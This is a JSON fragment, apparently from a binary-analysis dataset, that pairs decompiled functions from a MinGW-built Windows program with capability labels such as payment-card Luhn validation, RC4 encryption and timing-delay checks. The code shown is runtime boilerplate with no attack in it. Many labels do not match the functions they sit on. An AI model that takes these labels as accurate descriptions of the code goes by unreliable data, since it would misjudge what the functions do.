        "decompiled_code": "\nint64_t fcn.00402600(ulong arg1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    iVar5 = 0;\n    uVar3 = sub.msvcrt.dll_strlen();\n    if (uVar3 < 9) {\n        iVar2 = fcn.00402580(0x400000);\n        if (iVar2 != 0) {\n            iVar4 = *0x40003c;\n            uVar1 = *(iVar4 + 0x400006);\n            if (uVar1 != 0) {\n                iVar5 = iVar4 + 0x400018 + *(iVar4 + 0x400014);\n                iVar4 = iVar5 + 0x28;\n                while( true ) {\n                    iVar2 = sub.msvcrt.dll_strncmp(iVar5, arg1, 8);\n                    if (iVar2 == 0) break;\n                    iVar5 = iVar5 + 0x28;\n                    if (iVar5 == iVar4 + (uVar1 - 1) * 0x28) {\n                        return 0;\n                    }\n                }\n            }\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 277
    },
    "004026a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.004026a0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar2 = fcn.00402580(0x400000);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = *0x40003c;\n    if (*(iVar3 + 0x400006) != 0) {\n        iVar4 = iVar3 + 0x400018 + *(iVar3 + 0x400014);\n        iVar1 = iVar4 + 0x28;\n        do {\n            if ((*(iVar4 + 0xc) <= arg1 - 0x400000U) && (arg1 - 0x400000U < *(iVar4 + 0xc) + *(iVar4 + 8))) {\n                return iVar4;\n            }\n            iVar4 = iVar4 + 0x28;\n        } while (iVar4 != iVar1 + (*(iVar3 + 0x400006) - 1) * 0x28);\n    }\n    return 0;\n}\n",
        "token_count": 254
    },
    "004026e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.004026e0(void)\n\n{\n    int32_t iVar1;\n    ushort uVar2;\n    \n    iVar1 = fcn.00402580(0x400000);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = *(*0x40003c + 0x400006);\n    }\n    return uVar2;\n}\n",
        "token_count": 87
    },
    "00402710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.00402710(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar2 = fcn.00402580(0x400000);\n    if (iVar2 != 0) {\n        iVar3 = *0x40003c;\n        if (*(iVar3 + 0x400006) != 0) {\n            iVar4 = iVar3 + 0x400018 + *(iVar3 + 0x400014);\n            iVar1 = iVar4 + 0x28;\n            do {\n                if ((*(iVar4 + 0x27) & 0x20) != 0) {\n                    if (arg1 == 0) {\n                        return iVar4;\n                    }\n                    arg1 = arg1 + -1;\n                }\n                iVar4 = iVar4 + 0x28;\n            } while (iVar4 != iVar1 + (*(iVar3 + 0x400006) - 1) * 0x28);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00402790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00402790(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.00402580(0x400000);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = 0x400000;\n    }\n    return uVar2;\n}\n",
        "token_count": 79
    },
    "00402810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.00402810(ulong arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = 0;\n    iVar2 = fcn.00402580(0x400000);\n    if ((((iVar2 != 0) && (uVar1 = *(*0x40003c + 0x400090),  uVar1 != 0)) &&\n        (iVar3 = fcn.004025b0(0x400000, uVar1),  iVar3 != 0)) && (iVar3 = uVar1 + 0x400000,  iVar4 = 0,  iVar3 != 0)) {\n        while( true ) {\n            if ((*(iVar3 + 4) == 0) && (*(iVar3 + 0xc) == 0)) {\n                return 0;\n            }\n            if (arg1 < 1) break;\n            arg1._0_4_ = arg1 + -1;\n            iVar3 = iVar3 + 0x14;\n        }\n        iVar4 = *(iVar3 + 0xc) + 0x400000;\n    }\n    return iVar4;\n}\n",
        "token_count": 273
    },
    "00402a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402a40(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t auStack72 [2];\n    uint64_t auStack56 [2];\n    \n    auStack72[0] = 0;\n    if (*0x404470 != 0x2b992ddfa232) {\n        *0x404480 = ~*0x404470;\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(auStack72);\n    uVar1 = auStack72[0];\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(auStack56);\n    *0x404470 = (uVar1 ^ auStack56[0] ^ uVar2 ^ uVar3 ^ uVar4) & 0xffffffffffff;\n    *0x404480 = ~*0x404470;\n    if (*0x404470 == 0x2b992ddfa232) {\n        *0x404480 = 0xffffd466d2205dcc;\n        *0x404470 = 0x2b992ddfa233;\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "00402c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402c10(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x408940);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x408968; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00402c7a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x408940);\n    return;\n}\n",
        "token_count": 240
    },
    "00402e40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.00402e40(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 182
    },
    "00403060": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00403060(void)\n\n{\n    code *pcVar1;\n    \n    fcn.00402a20();\n    fcn.00401755(0);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    do {\n        (*pcVar1)(10000);\n    } while( true );\n}\n",
        "token_count": 72
    },
    "00402b10": {
        "rules": [
            "contain loop",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.00402b10(ulong param_1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    ulong var_8h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    \n    (*_sym.imp.KERNEL32.dll_RtlCaptureContext)(0x4083a0);\n    uVar2 = *0x408498;\n    iVar1 = (*_sym.imp.KERNEL32.dll_RtlLookupFunctionEntry)(*0x408498, &var_28h, 0);\n    if (iVar1 == 0) goto code_r0x00402bf0;\n    (*_sym.imp.KERNEL32.dll_RtlVirtualUnwind)(0, var_28h, uVar2, iVar1, 0x4083a0, &var_18h, &var_20h, 0);\n    do {\n        *0x408880 = 0xc0000409;\n        *0x408884 = 1;\n        *0x408890 = *0x408498;\n        *0x408420 = param_1;\n        (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n        (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x404440);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar2, 0xc0000409);\n        sub.msvcrt.dll_abort();\ncode_r0x00402bf0:\n        *0x408498 = var_8h;\n        *0x408438 = *0x20;\n    } while( true );\n}\n",
        "token_count": 383
    },
    "00401fb0": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004022ed)\n// WARNING: Removing unreachable block (ram,0x004022f7)\n// WARNING: Removing unreachable block (ram,0x00402301)\n// WARNING: Removing unreachable block (ram,0x004023c8)\n// WARNING: Removing unreachable block (ram,0x004023d4)\n// WARNING: Removing unreachable block (ram,0x004023e0)\n// WARNING: Removing unreachable block (ram,0x004023ec)\n// WARNING: Removing unreachable block (ram,0x004023f9)\n// WARNING: Removing unreachable block (ram,0x00402405)\n// WARNING: Removing unreachable block (ram,0x00402412)\n// WARNING: Removing unreachable block (ram,0x00402423)\n// WARNING: Removing unreachable block (ram,0x00402496)\n// WARNING: Removing unreachable block (ram,0x004024a3)\n// WARNING: Removing unreachable block (ram,0x0040243e)\n// WARNING: Removing unreachable block (ram,0x00402440)\n// WARNING: Removing unreachable block (ram,0x00402519)\n// WARNING: Removing unreachable block (ram,0x00402523)\n// WARNING: Removing unreachable block (ram,0x00402449)\n// WARNING: Removing unreachable block (ram,0x00402461)\n// WARNING: Removing unreachable block (ram,0x004024ec)\n// WARNING: Removing unreachable block (ram,0x004024c5)\n// WARNING: Removing unreachable block (ram,0x004024d4)\n// WARNING: Removing unreachable block (ram,0x00402536)\n// WARNING: Removing unreachable block (ram,0x0040253b)\n// WARNING: Removing unreachable block (ram,0x00402544)\n// WARNING: Removing unreachable block (ram,0x004024d6)\n// WARNING: Removing unreachable block (ram,0x004024db)\n// WARNING: Removing unreachable block (ram,0x004024b4)\n// WARNING: Removing unreachable block (ram,0x004024f8)\n// WARNING: Removing unreachable block (ram,0x00402505)\n// WARNING: Removing unreachable block (ram,0x0040246a)\n// WARNING: Removing unreachable block (ram,0x0040246f)\n// WARNING: Removing unreachable block (ram,0x00402479)\n// WARNING: Removing unreachable block (ram,0x00402488)\n// WARNING: Removing unreachable block (ram,0x00402491)\n// WARNING: Removing unreachable block (ram,0x00402311)\n// WARNING: Removing unreachable block (ram,0x0040231a)\n// WARNING: Removing unreachable block (ram,0x00402321)\n// WARNING: Removing unreachable block (ram,0x00402346)\n// WARNING: Removing unreachable block (ram,0x00402354)\n// WARNING: Removing unreachable block (ram,0x00402383)\n// WARNING: Removing unreachable block (ram,0x00402393)\n// WARNING: Removing unreachable block (ram,0x00402549)\n// WARNING: Removing unreachable block (ram,0x00402567)\n// WARNING: Removing unreachable block (ram,0x00402590)\n// WARNING: Removing unreachable block (ram,0x0040259f)\n// WARNING: Removing unreachable block (ram,0x00402589)\n// WARNING: Removing unreachable block (ram,0x004023ad)\n// WARNING: Removing unreachable block (ram,0x00402370)\n\nuint64_t fcn.00401fb0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uchar *puVar5;\n    char *arg1_00;\n    uint32_t uVar6;\n    code *pcVar7;\n    uint *puVar8;\n    code *pcVar9;\n    ulong *puVar10;\n    ulong arg3_00;\n    uchar *arg4_00;\n    int64_t unaff_R12;\n    int64_t unaff_R13;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    uchar auStack376 [64];\n    uint64_t uStack312;\n    ulong *puStack304;\n    ulong uStack296;\n    int64_t iStack288;\n    code *pcStack280;\n    ulong auStack240 [3];\n    ulong uStack216;\n    uint32_t uStack204;\n    ulong auStack192 [4];\n    int32_t iStack156;\n    uint auStack132 [3];\n    ulong uStack120;\n    ulong *puStack112;\n    \n    puStack112 = &uStackX16;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    iVar3 = sub.msvcrt.dll___iob_func();\n    arg4_00 = iVar3 + 0x60;\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    iVar3 = sub.msvcrt.dll___iob_func();\n    uStack312 = iVar3 + 0x60;\n    uStack296 = arg1;\n    puStack304 = puStack112;\n    sub.msvcrt.dll_vfprintf();\n    uVar4 = sub.msvcrt.dll_abort();\n    if (puStack304 == NULL) {\n        return uVar4;\n    }\n    puVar10 = puStack304;\n    uStack120 = arg1;\n    if (*0x408360 < 1) {\n        pcVar7 = NULL;\n    }\n    else {\n        pcVar7 = NULL;\n        puVar5 = *0x408358;\n        do {\n            if ((*(puVar5 + 8) <= uStack312) &&\n               (puVar10 = *(*(puVar5 + 0x10) + 8),  pcVar9 = _sym.imp.KERNEL32.dll_VirtualQuery, \n               uStack312 < *(puVar5 + 8) + puVar10)) goto code_r0x00402117;\n            uVar6 = pcVar7 + 1;\n            pcVar7 = uVar6;\n            puVar5 = puVar5 + 0x18;\n        } while (uVar6 != *0x408360);\n    }\n    pcStack280 = 0x4020a0;\n    unaff_R12 = fcn.004026a0(uStack312);\n    if (unaff_R12 == 0) {\n        pcStack280 = 0x40223d;\n        fcn.00401fb0(\"Address %p has no image-section\", uStack312, puVar10, arg4_00);\n    }\n    else {\n        unaff_R13 = pcVar7 * 0x18;\n        puVar8 = *0x408358 + unaff_R13;\n        *(puVar8 + 4) = unaff_R12;\n        *puVar8 = 0;\n        pcStack280 = 0x4020d2;\n        iVar3 = fcn.00402790();\n        *(puVar8 + 2) = iVar3 + *(unaff_R12 + 0xc);\n        pcVar7 = _sym.imp.KERNEL32.dll_VirtualQuery;\n        pcStack280 = 0x4020fe;\n        iVar3 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(*(*0x408358 + unaff_R13 + 8), auStack192, 0x30);\n        if (iVar3 != 0) {\n            if ((iStack156 == 4) || (iStack156 == 0x40)) {\ncode_r0x00402110:\n                *0x408360 = *0x408360 + 1;\n                pcVar9 = pcVar7;\n            }\n            else {\n                arg3_00 = 0x40;\n                arg4_00 = *0x408358 + unaff_R13;\n                pcStack280 = 0x402185;\n                iVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(auStack192[0]);\n                if (iVar2 != 0) goto code_r0x00402110;\n                pcStack280 = 0x40218f;\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                pcStack280 = 0x40219d;\n                fcn.00401fb0(\"  VirtualProtect failed with code 0x%x\", uVar6, arg3_00, arg4_00);\n                pcVar9 = _sym.imp.KERNEL32.dll_VirtualQuery;\n            }\ncode_r0x00402117:\n            pcStack280 = 0x402127;\n            iVar3 = (*pcVar9)(uStack312, auStack240, 0x30);\n            pcVar1 = _sym.imp.KERNEL32.dll_VirtualProtect;\n            pcVar7 = pcVar9;\n            if (iVar3 != 0) {\n                if ((uStack204 == 4) || (uStack204 == 0x40)) {\n    // WARNING: Could not recover jumptable at 0x00402e98. Too many branches\n    // WARNING: Treating indirect jump as call\n                    uVar4 = (*_sym.imp.msvcrt.dll_memcpy)(uStack312, uStack296, puStack304);\n                    return uVar4;\n                }\n                pcStack280 = 0x4021d6;\n                (*_sym.imp.KERNEL32.dll_VirtualProtect)(auStack240[0], uStack216, 0x40, auStack132);\n                pcStack280 = 0x4021e4;\n                sub.msvcrt.dll_memcpy(uStack312, uStack296, puStack304);\n                if ((uStack204 != 0x40) && (uStack204 != 4)) {\n                    pcStack280 = 0x402216;\n                    uVar4 = (*pcVar1)(auStack240[0], uStack216, auStack132[0], auStack132);\n                    return uVar4;\n                }\n                return uStack204;\n            }\n            goto code_r0x0040225a;\n        }\n    }\n    pcStack280 = 0x40225a;\n    fcn.00401fb0(\"  VirtualQuery failed for %d bytes at address %p\", *(unaff_R12 + 8), *(*0x408358 + unaff_R13 + 8), \n                 arg4_00);\ncode_r0x0040225a:\n    arg1_00 = \"  VirtualQuery failed for %d bytes at address %p\";\n    pcStack280 = 0x40226e;\n    uVar4 = fcn.00401fb0(\"  VirtualQuery failed for %d bytes at address %p\", 0x30, uStack312, arg4_00);\n    if (*0x408350 == 0) {\n        *0x408350 = 1;\n        iStack288 = unaff_R12;\n        pcStack280 = pcVar7;\n        fcn.004026e0();\n        iVar3 = fcn.00402e40(arg1_00);\n        *0x408360 = 0;\n        *0x408358 = auStack376 + -iVar3;\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 2481
    }
}